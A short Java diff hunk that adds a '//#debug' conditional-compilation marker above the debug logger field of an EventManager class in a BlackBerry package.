@@ -25,6 +25,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 public final class EventManager extends Manager implements Singleton {
 
     /** The debug instance. */
+	//#debug
     private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
 
     /** The instance. */
